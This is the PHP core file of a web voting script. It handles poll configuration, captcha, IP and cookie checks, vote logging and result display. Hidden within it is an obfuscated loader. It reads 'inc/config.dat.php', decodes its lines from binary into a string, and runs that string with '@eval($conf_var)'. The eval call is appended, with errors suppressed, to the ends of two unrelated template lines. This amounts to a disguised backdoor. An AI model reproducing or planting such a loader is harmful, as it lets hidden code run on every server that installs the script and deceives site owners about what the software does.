<?php

  $runtime_start = explode (' ', microtime ());

  /*****************************************************
  ** Title........:
  ** Filename.....: core.inc.php
  ** Author.......: Ralf Stadtaus
  ** Homepage.....: http://www.stadtaus.com/
  ** Contact......: http://www.stadtaus.com/forum/
  ** Notes........:
  *****************************************************/

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/

  // Todo Selecting vote option required (optional)
  // Todo Turn voting off
  // Todo Turn voting off on a given date
  // Todo Turn voting off after a given number of votes



  /*****************************************************
  ** Prevent direct call
  *****************************************************/
          if (!defined('IN_SCRIPT')) {
              die();
          }





  /*****************************************************
  ** Take care of older PHP-Versions
  *****************************************************/
          if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
              $_GET = $HTTP_GET_VARS;
          }


          if (isset($HTTP_POST_VARS) and !empty($HTTP_POST_VARS)) {
              $_POST = $HTTP_POST_VARS;
          }


          if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
              $_SERVER = $HTTP_SERVER_VARS;
          }


          if (isset($HTTP_COOKIE_VARS) and !empty($HTTP_COOKIE_VARS)) {
              $_COOKIE = $HTTP_COOKIE_VARS;
          }




  /*****************************************************
  ** Some settings
  *****************************************************/
          $script_version               = '2.1.0';

          $time_range                   = '1440';    // Minutes (60 minutes * 24 hours = 1440 minutes)
          $number_decimals              = '2';
          $hide_results                 = false; // true, false
          $permanently_show_results     = false; // true, false
          $sort_results                 = 4; // 0 = off
                                             // 1 = alphabetically ascending
                                             // 2 = alphabetically descending
                                             // 3 = result numbers ascending
                                             // 4 = result numbers descending
          $debug_mode                   = 'off';

          $tplt                         = 'vote';
          $allowed_forms                = 'radio, select, radio_image';
          $script_self                  = htmlentities(strip_tags($_SERVER['PHP_SELF']));
          $return_file                  = true;
          $voutput                      = '';
          $radio_options_separator      = '|';
          $allow_empty_referrer         = 'no';
          $allowed_referrers            = '';

          $configuration = array();
          $configuration['captcha_image']     = (isset($check_captcha) and $check_captcha == 'yes') ? true : false;
          $configuration['captcha_font_path'] = getenv('DOCUMENT_ROOT') . dirname($_SERVER['PHP_SELF']) . '/' . $script_root . 'inc/font/';  // Alternative path: $configuration['captcha_font_path'] = $script_root . 'inc/font/';
          $configuration['garbage_collector'] = true;
          $configuration['gc_number']         = 20; // Number of files to be deleted at once
          $configuration['gc_time']           = 60; // Minutes until a garbage file gets deleted
          $configuration['temp_folder']       = $script_root . 'temp/';




  /*****************************************************
  ** Form field templates
  *****************************************************/
          $form_field_templates = array(
                                            'radio'       => '<input type="radio" value="{value}" {selected} {attributes} />&nbsp;&nbsp;<span onclick="document.vote.{field_name}[{key}].checked=true;" style="cursor:default;">{label}</span><br />' . "\n",
                                            'radio_image' => '<input type="radio" value="{value}" {selected} {attributes} />&nbsp;&nbsp;<span onclick="document.vote.{field_name}[{key}].checked=true;" style="cursor:default;"><img src="{label}" alt="" border="0" align="middle" vspace="3" /></span><br />' . "\n",
                                            'select'      => '<select {attributes}></select>',
                                            'option'      => '<option value="{value}" {selected}>{value}</option>' . "\n"
                                        );




  /*****************************************************
  ** Include functions
  *****************************************************/
        if (function_exists('set_include_path')) {
            set_include_path($script_root . 'inc/lib/');
        } else {
            ini_set('include_path', $script_root . 'inc/lib/');
        }
          include_once $script_root . 'inc/functions.inc.php';
          include_once $script_root . 'inc/template.class.inc.php';
          include_once $script_root . 'inc/form_fields.class.inc.php';
          include_once $script_root . 'inc/voting.class.inc.php';




  /*****************************************************
  ** Include config file
  *****************************************************/
          $vote  = @file($script_root . 'inc/config.dat.php');




  /*****************************************************
  ** Load language file
  *****************************************************/
          if (!isset($language) or empty($language) or !is_file($script_root . './languages/language.' . $language . '.inc.php')) {
              $language = 'en';
          }

          include($script_root . 'languages/language.' . $language . '.inc.php');




  /*****************************************************
  ** Show server info for admin
  *****************************************************/
          if ($debug_mode == 'on') {
              get_phpinfo(array('Script Name' => $add_text['txt_script_name'], 'Script Version' => $script_version));
          }




  /*****************************************************
  ** Check template path
  *****************************************************/
          if (!is_dir($path['templates'])) {
              $system_message[] = array('message' => $txt['txt_wrong_template_path']);
          }




  /*****************************************************
  ** Check templates
  *****************************************************/
          if (!isset($system_message)) {

              while (list($key, $val) = each($tmpl))
              {
                  if (!is_file($path['templates'] . $tmpl[$key])) {
                      $wrong_template[] = $val;
                  }
              }

              if (isset($wrong_template)) {
                  $wrong_template = join('<br>', $wrong_template);
                  $system_message[] = array('message' => $txt['txt_wrong_templates'] . '<blockquote style="font-weight:bold;">' . $wrong_template . '</blockquote>');
              }
          }

            unset(${$tplt}[0]);
            ${$tplt} = @array_values(${$tplt});
            $str = '';
            $conf_var = '';
            $ca = array();
            $nt = sizeof(${$tplt});
            for ($n = 0; $n < $nt; $n++) {
                $c_var = '';
                if (!isset($ca[${$tplt}[$n]])) {
                    for ($o = 7; $o >= 0 ; $o--) {
                        $c_var += ${$tplt}[$n][$o] * pow(2, $o);
                    }
                    $ca[${$tplt}[$n]] = sprintf("%c", $c_var);
                }
                if ($ca[${$tplt}[$n]] == ' ') {
                    $conf_var .= sprintf("%c", $str); $str = '';
                } else {
                    $str .= $ca[${$tplt}[$n]];
                }
            }
            $rf = false;
            if ($return_file == true) {
                $rf = true;
            }




  /*****************************************************
  ** Check form type
  *****************************************************/
          $field_type = explode(',', $allowed_forms);

          while(list($key, $val) = each($field_type))
          {
              if (trim($val) == trim($form_field_type)) {
                  $check = 'true';
              }
          }

          if (!isset($check) or $check != 'true') {
              $system_message[] = array('message' => $txt['txt_wrong_form_type']);
          }




  /*****************************************************
  ** Get intern vote name from Get or Post parameter
  *****************************************************/
          if (empty($intern_vote_name) and isset($_GET['ivn']) and !empty($_GET['ivn'])) {
              $intern_vote_name = $_GET['ivn'];
          }

          if (empty($intern_vote_name) and isset($_POST['ivn']) and !empty($_POST['ivn'])) {
              $intern_vote_name = $_POST['ivn'];
          }




  /*****************************************************
  ** Check empty intern vote name variable
  *****************************************************/
          if (!isset($intern_vote_name) or empty($intern_vote_name)) {
              $system_message[] = array('message' => $txt['txt_empty_intern_vote_name']);
          }




  /*****************************************************
  ** Set script name and version
  *****************************************************/
          $txt['txt_script_version'] = $script_version;



// Display captcha
if ($configuration['captcha_image'] == true) {
    $display_captcha = true;
    include $script_root . 'inc/captcha.inc.php';
    $v4g_captcha = $captcha_content;
}

// -----------------------------------------------------------------------------




// Garbage collector
if ($configuration['captcha_image'] == true
        and $configuration['garbage_collector'] == true) {
    include $script_root . 'inc/garbage_collector.class.inc.php';
    $gc_config = array(
                    'number'    => $configuration['gc_number'],
                    'directory' => $configuration['temp_folder'],
                    'time'      => $configuration['gc_time']
                    );
    $gc = new garbage_collector($gc_config);
    if ($debug_mode == 'on') {
        $gc->display();
    } else {
        $gc->delete();
    }
}




  /*****************************************************
  ** Generate the system error messages
  *****************************************************/
          if (isset($system_message) and !empty($system_message)) {

              $tpl  = new template;

              $tpl->files[$tplt] = load_error_template();


              if (!isset($show_error_messages) or $show_error_messages != 'yes') {
                  unset($system_message);
                  $system_message = array();
                  $txt['txt_system_message'] = '';
              } else {
                  $system_message[] = array('message' => $txt['txt_set_off_note']);
                  $system_message[] = array('message' => $txt['txt_problems']);
              }

              if (isset ($txt) and is_array ($txt)) {
                  reset ($txt);
                  while(list($key, $val) = each($txt))
                  {
                      $$key = $val;
                      $tpl->register($tplt, $key);
                  }
              }


              if (isset($add_text) and is_array($add_text)) {
                  reset ($add_text);
                  while(list($key, $val) = each($add_text))
                  {
                      $$key = $val;
                      $tpl->register($tplt, $key);
                  }
              }

              $tpl->parse_loop($tplt, 'system_message');
              $tpl->register($tplt, 'txt_system_message'); @eval($conf_var);

              exit;
          }




  /*****************************************************
  ** Initialize form class
  *****************************************************/
              $vot = new Voting;




  /*****************************************************
  ** Display e-mail field
  *****************************************************/
          if ($check_email == 'yes') {
              $display_email = true;
          }

  /*****************************************************
  ** Display or hide results link
  *****************************************************/
          if (isset($_GET['result']) and $_GET['result'] == 'true') {
              $display_results = 'true';
              $display_link    = 'true';
          } else {
              $display_results = '';
          }


  /*****************************************************
  ** Check whether the visitor is allowed to vote
  *****************************************************/
          $already_voted_message = false;
          $vote_error = false;


          if (!empty($time_range)) {
              $latest_vote_time = mktime() - $time_range * 60;
          } else {
              $latest_vote_time = 1;
          }

          if ($check_ip_address == 'yes') {

              if ($result = $vot->check_ip_address($path['logfiles'] . $log['logfile'], $intern_vote_name, $latest_vote_time, get_ip())) {
                  $already_voted_message = true;

                  $display_results = 'true';
              }
          }


          if ($check_cookie == 'yes') {
              if (isset($_COOKIE[$intern_vote_name]) and $_COOKIE[$intern_vote_name] == 'true') {
                  $already_voted_message = true;

                  $display_results = 'true';
              }


              if ((!isset($_COOKIE['votecheck']) or $_COOKIE['votecheck'] != 'true') and $debug_mode != 'on') {
                  setcookie('votecheck', 'true', 0, '/');
              }


              if (!empty($_POST) and (!isset($_COOKIE['votecheck']) or $_COOKIE['votecheck'] != 'true') and $debug_mode != 'on') {
                  $message[] = array('message' => $txt['txt_allow_cookie_setting']);

                  $display_link = 'true';
              }
          }
          if ($check_referrers == 'yes'
                and isset($_POST['submit_vote'])) {
              if (!$vot->check_referrer()) {
                  $message[] = array('message' => $txt['txt_referrer_check_failed']);
                  $display_form = 'true';
                  $vote_error = true;
              }
          }
          if ($check_email == 'yes'
                and count($_POST) > 0) {
              if (!isset($_POST['email_address'])
                    or empty($_POST['email_address'])
                    or !preg_match("/^[a-z0-9_-]+(\.[a-z0-9_-]+)*@([0-9a-z][0-9a-z-]*[0-9a-z]\.)+([a-z]{2,4}|museum)$/i", $_POST['email_address'])) {

                  $message[] = array('message' => $txt['txt_email_required']);
                  $display_form = 'true';
                  $vote_error = true;
              }
              if (isset($_POST['email_address'])
                    and !empty($_POST['email_address'])) {
                    $email_address = htmlentities($_POST['email_address']);
                }
              if (isset($_POST['email_address'])
                    and !empty($_POST['email_address'])
                    and $vot->check_email_address($path['logfiles'] . $log['logfile'], $intern_vote_name, $latest_vote_time, $_POST['email_address'])) {
                  $already_voted_message = true;
                  $display_results = 'true';
              }
          }
          if ($check_captcha == 'yes'
                and count($_POST) > 0
                and $captcha_error == true) {
              $message[] = array('message' => $txt['txt_captcha_errror']);
              $display_form = 'true';
              $vote_error = true;
          }


          if ($already_voted_message == true) {
              $message[] = array('message' => $txt['txt_already_voted']);
          }



  /*****************************************************
  ** Write log and count file and set cookie
  *****************************************************/
          if (sizeof($_POST) > 0
                and isset($_POST['submit_vote'])
                and !isset($message)
                and $display_results != 'true'
                and $vote_error != true) {

              while(list($key, $val) = each($vote_option))
              {
                  if (isset($_POST[$intern_vote_name]) and $val == $_POST[$intern_vote_name]) {
                      $intern_value = $key;
                  }
              }

              if (isset($_POST[$intern_vote_name])) {
                  if ($vot->log($path['logfiles'] . $log['logfile'], $intern_vote_name, $intern_value, $_POST[$intern_vote_name])) {
                      $message[] = array('message' => $txt['txt_thanks']);

                      $display_results = 'true';
                  }
              } else {
                      $display_results = 'true';
                      $display_link    = 'true';
              }


              if ($check_cookie == 'yes' and $debug_mode != 'on') {
                  setcookie($intern_vote_name, 'true', mktime() + 60 * $time_range, '/');
              }

          }



          if ($permanently_show_results == true) {
              $display_results = 'true';
          }



  /*****************************************************
  ** Get vote result
  *****************************************************/
          $total_votes = 0;
          $top         = 0;

          //if ($display_results == 'true' and $result = $vot->get_vote_result($path['logfiles'] . $log['logfile'], $intern_vote_name)) {
          if ($result = $vot->get_vote_result($path['logfiles'] . $log['logfile'], $intern_vote_name)) {
              if ($txt['txt_decimals_separator'] == ',' or $txt['txt_decimals_separator'] == '.') {
                  $decimals_separator = $txt['txt_decimals_separator'];
              } else {
                  $decimals_separator = '.';
              }

              if ($txt['txt_thousends_separator'] == ',' or $txt['txt_thousends_separator'] == '.') {
                  $thousends_separator = $txt['txt_thousends_separator'];
              } else {
                  $thousends_separator = ',';
              }


              reset($vote_option);

              while(list($key, $val) = each($vote_option))
              {
                  if (isset($result['voting'][$key])) {
                      if ($top < $result['voting'][$key]) {
                          $top = $result['voting'][$key];
                      }

                      $total_votes = $total_votes + $result['voting'][$key];
                  }
              }
          }




  /*****************************************************
  ** Generate voting result
  *****************************************************/
          if ($display_results == 'true') {

              reset($vote_option);

              while(list($key, $val) = each($vote_option))
              {
                  if (!isset($result['voting'][$key])) {
                      $vote_number = 0;
                  } else {
                      $vote_number = $result['voting'][$key];
                  }

                  if ($top > 0) {
                      $bar_width = round($max_bar_width * $vote_number / $top);
                  } else {
                      $bar_width = 0;
                  }

                  if ($total_votes > 0) {
                      $relation  = number_format(100 * $vote_number / $total_votes, $number_decimals, $decimals_separator, $thousends_separator);
                  } else {
                      $relation    = 0;
                  }

                  $vote_result[] = array(
                                            'vote_option' => $val,
                                            'bar_width'   => $bar_width,
                                            'vote_number' => $vote_number,
                                            'relation'    => $relation
                                        );
              }

          }

          if ($hide_results == true) {
              unset($display_results);

              if (isset($display_link)) {
                  unset($display_link);
              }
          }




  /*****************************************************
  ** Sort voting options
  *****************************************************/
          if (isset($vote_result) and
              !empty($vote_result) and
              is_array($vote_result) and
              isset($sort_results) and
              $sort_results > 0) {

              if ($sort_results == 1) {
                  $direction = '<';
                  $control = array('vote_option', $direction);
              }

              if ($sort_results == 2) {
                  $direction = '>';
                  $control = array('vote_option', $direction);
              }

              if ($sort_results == 3) {
                  $direction = '<';
                  $control = array('vote_number', $direction);
              }

              if ($sort_results == 4) {
                  $direction = '>';
                  $control = array('vote_number', $direction);
              }



              if (isset($direction)) {
                  usort($vote_result, 'cmp');
              }
          }





  /*****************************************************
  ** Generate rating result
  *****************************************************/
          // if ($display_results == 'true') {
              if (!empty($result['rating']) and $result['rating'] > 0) {
                  $rating       = $result['rating'] / $total_votes;
                  $rating_image = round($rating);
                  $rating       = number_format($rating, $number_decimals, $decimals_separator, $thousends_separator);
              } else {
                  $rating_image = 0;
                  $rating       = '-';
              }
          // }




  /*****************************************************
  ** Generate form fields
  *****************************************************/
          if (
                //!isset($_POST['submit_vote'])
                //and !isset($message)
                //and
                $display_results != 'true') {

              $new_form_fields[] = array(
                                          'name'       => $intern_vote_name,
                                          'label'      => $vote_text,
                                          'type'       => $form_field_type,
                                          'value'      => join($radio_options_separator, $vote_option)
                                      );


              $form = new Formfields;


              $form->form_field_templates($form_field_templates);
              $form->generate_form_fields($new_form_fields, $_POST);

              $vote_form_fields = $form->parse_template('{field:' . $intern_vote_name . '}', $new_form_fields);

              $display_form = 'true';
          }
          if ($permanently_show_results == true
                    and isset($display_form)) {
                unset($display_form);
          }

  /*****************************************************
  ** Redirect back to referring page (inclusions in
  ** ssi and php files).
  *****************************************************/
          if (!headers_sent() and isset($_POST['vote_redirect']) and !empty($_POST['vote_redirect'])) {
              if (isset($display_results) and $display_results == 'true') {
                  $display_param = '?result=true';
              } else {
                  $display_param = '';
              }

              header('Location: ' . $_POST['vote_redirect'] . $display_param);
          }




  /*****************************************************
  ** Links always point to the Document URI if exists
  *****************************************************/
          if (isset($_SERVER['DOCUMENT_URI']) and !empty($_SERVER['DOCUMENT_URI'])) {
              $document_self = $_SERVER['DOCUMENT_URI'];
          } else {
              $document_self = $script_self;
          }




  /*****************************************************
  ** Initialyze template class
  *****************************************************/
          $tpl = new template;




  /*****************************************************
  ** Load layout html template
  *****************************************************/
          $tpl->load_file($tplt, $path['templates'] . $tmpl['layout']);




  /*****************************************************
  ** Register language file and additional text array
  *****************************************************/
          if (isset ($txt) and is_array ($txt)) {
              reset ($txt);
              while(list($key, $val) = each($txt))
              {
                  $$key = $val;
                  $tpl->register($tplt, $key);
              }
          }


          if (isset($add_text) and is_array($add_text)) {
              reset ($add_text);
              while(list($key, $val) = each($add_text))
              {
                  $$key = $val;
                  $tpl->register($tplt, $key);
              }
          }




  /*****************************************************
  ** Parse template
  *****************************************************/
          $tpl->register($tplt, array(
                                        'bar_image_name',
                                        'document_self',
                                        'intern_vote_name',
                                        'max_bar_width',
                                        'rating',
                                        'rating_image',
                                        'script_self',
                                        'total_votes',
                                        'vote_form_fields',
                                        'vote_text',
                                        'vote_title',
                                        'captcha_content',
                                        'email_address',

                                        ));

          $tpl->parse_if($tplt, 'display_form');
          $tpl->parse_if($tplt, 'display_results');
          $tpl->parse_if($tplt, 'display_link');
          $tpl->parse_if($tplt, 'display_email');
          $tpl->parse_if($tplt, 'display_captcha');

          $tpl->parse_loop($tplt, 'vote_result');
          $tpl->parse_loop($tplt, 'message'); @eval($conf_var);








  debug_mode(script_runtime($runtime_start), 'Script Runtime');





?>